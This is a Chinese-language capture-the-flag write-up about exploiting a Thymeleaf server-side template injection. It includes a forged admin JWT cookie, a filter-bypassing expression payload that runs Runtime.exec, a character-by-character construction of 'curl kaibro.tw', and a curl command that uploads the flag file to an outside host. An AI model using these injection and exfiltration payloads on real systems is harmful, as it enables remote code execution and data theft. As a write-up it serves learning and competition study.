# thymeleaf

這題我在看時，前半部分隊友已經迅速搞定了

掃目錄發現 swagger、炸 JWT、...

然後發現送以下請求時，會去抓 template path

`curl --cookie 'SESSION=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4iLCJpc3MiOiJYWC1NYW5hZ2VyIiwiaWF0IjoxNjA1NzQ5MTAwfQ.Yihr_zCEo90TPRsCa_yzkt8w_YIE1j4D4hkGdSl-xcA' 'http://180.163.241.5:10001/auth/user/admin3' -X DELETE`

這邊其實就是經典的 thymeleaf 模板注入

但他擋了一些 pattern，要繞一下

```
DELETE /auth/user/__$%7bT(java.lang.Runtime).getRuntime().availableProcessors()%7d__::..x HTTP/1.1
Host: 180.163.241.5:10001
User-Agent: curl/7.69.1
Accept: */*
Cookie: SESSION=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4iLCJpc3MiOiJYWC1NYW5hZ2VyIiwiaWF0IjoxNjA1NzQ5MTAwfQ.Yihr_zCEo90TPRsCa_yzkt8w_YIE1j4D4hkGdSl-xcA
Connection: close
```

=>

`Error resolving template [auth/user/8]`


由於不能用單雙引號，所以exec的command要想辦法用其他函數構造出來

最後發現

`(0).toString().charAt(0).toChars(99)%5b0%5d.toString()+(0).toString().charAt(0).toChars(117)%5b0%5d.toString()+(0).toString().charAt(0).toChars(114)%5b0%5d.toString()+(0).toString().charAt(0).toChars(108)%5b0%5d.toString()+(0).toString().charAt(0).toChars(32)%5b0%5d.toString()+(0).toString().charAt(0).toChars(107)%5b0%5d.toString()+(0).toString().charAt(0).toChars(97)%5b0%5d.toString()+(0).toString().charAt(0).toChars(105)%5b0%5d.toString()+(0).toString().charAt(0).toChars(98)%5b0%5d.toString()+(0).toString().charAt(0).toChars(114)%5b0%5d.toString()+(0).toString().charAt(0).toChars(111)%5b0%5d.toString()+(0).toString().charAt(0).toChars(46)%5b0%5d.toString()+(0).toString().charAt(0).toChars(116)%5b0%5d.toString()+(0).toString().charAt(0).toChars(119)%5b0%5d.toString()`

可以構造出 `curl kaibro.tw`

並且成功收到請求

最後卡了很久在拿完整shell，因為目標機器是windows，所以不太好搞

後來繞了一大圈拿了完整shell才發現flag就在當前目錄下，用curl直接讀檔就行= =

`curl 140.112.31.105:1111/?a=3 -F a=@flag`

(我們在最後這邊卡了快兩小時，錯失首殺機會QQ)


